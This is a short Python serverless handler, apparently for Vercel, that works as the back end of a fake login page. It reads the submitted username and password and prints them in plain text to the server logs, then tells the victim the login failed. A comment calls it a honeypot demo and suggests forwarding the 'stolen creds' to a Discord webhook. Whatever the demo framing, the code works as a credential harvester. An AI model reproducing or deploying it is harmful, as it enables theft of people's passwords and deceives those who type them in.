from http.server import BaseHTTPRequestHandler
import json

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        # 1. Read the incoming payload
        content_length = int(self.headers.get('Content-Length', 0))
        raw_body = self.rfile.read(content_length).decode('utf-8')
        
        try:
            data = json.loads(raw_body)
            username = data.get('username', 'N/A')
            password = data.get('password', 'N/A')
            
            # 2. LOG THE CAPTURE 
            # This prints directly to the Vercel Serverless Logs
            print(f"🔥 [SOCKETSNOOP CAPTURE] User: {username} | Pass: {password}")
            
            # Pro Demo Tip: You could also add a few lines here using the 'requests' 
            # library to POST this data to a Discord Webhook. Watching the stolen creds 
            # drop into a Discord channel live during a demo gets a great crowd reaction.
            
        except Exception as e:
            print(f"Error parsing honeypot data: {e}")

        # 3. Send the fake "failed login" response back to the browser
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"Invalid credentials. Incident logged.")

    def do_GET(self):
        self.send_response(405)
        self.end_headers()
